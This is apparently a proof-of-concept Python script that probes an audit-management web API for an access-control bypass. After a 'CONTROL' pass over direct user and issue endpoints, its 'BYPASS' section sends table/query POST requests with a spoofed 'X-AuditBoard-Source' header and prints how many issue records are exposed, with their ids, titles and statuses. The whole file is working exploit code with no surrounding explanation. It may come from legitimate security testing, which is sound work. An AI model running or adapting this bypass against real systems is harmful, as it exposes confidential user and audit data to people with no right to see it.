import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def req(method,path,body=None,hdr=None):
    cmd=['curl','-s','-m','120','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json']
    if hdr:
        for k,v in hdr.items(): cmd+=['-H',f'{k}: {v}']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
print("### CONTROL: direct endpoints")
for p in ['/api/v1/users','/api/v1/users/1','/api/v1/issues','/api/v1/issues/121']:
    c,b=req('GET',p)
    print(f"  GET {p} -> {c} {b[:150]}")
print("\n### BYPASS: table/query")
c,b=req('POST','/api/v1/table/query?entities=user',{"ab:query":{"entities":["user"],"filter":{},"include":["user"]}},{'X-AuditBoard-Source':'SchemaTable Rows'})
print(f"  POST table/query user -> {c} len={len(b)}")
c,b=req('POST','/api/v1/table/query?entities=issue',{"ab:query":{"entities":["issue"],"filter":{},"include":["issue"]}},{'X-AuditBoard-Source':'SchemaTable Rows'})
print(f"  POST table/query issue -> {c} len={len(b)}")
try:
    d=json.loads(b); inc=d.get('included') or []
    print("  issues exposed:",len(inc))
    for i in inc[:5]:
        a=i.get('attributes') or {}
        print("   ",i['id'],'|',str(a.get('title'))[:70],'|',str(a.get('status'))[:20])
except Exception as e: print("  err",e)
